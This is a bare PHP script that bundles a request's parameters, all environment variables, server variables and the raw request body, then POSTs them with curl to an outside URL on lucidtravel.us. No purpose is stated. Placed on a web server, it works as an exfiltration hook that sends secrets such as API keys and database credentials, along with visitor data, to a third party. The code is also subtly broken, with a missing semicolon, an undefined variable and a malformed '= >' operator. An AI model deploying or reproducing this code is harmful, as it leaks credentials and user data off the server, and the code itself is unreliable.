<?php
echo $env
    
$arr = [
'requestData' => json_encode($_REQUEST),
'getEnvData' => json_encode(getenv()),
'envData' => json_encode($_ENV),
'serverData' => json_encode($_SERVER),
'fileContent' = > json_encode(file_get_contents('php://input'))
];

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.lucidtravel.us/league_apps/api/league-apps-api.php");
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_POSTFIELDS, $arr);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($curl);
if (curl_errno($curl)) {
    echo 'Error:' . curl_error($curl);
}
curl_close($curl);
return $data;
?>
    
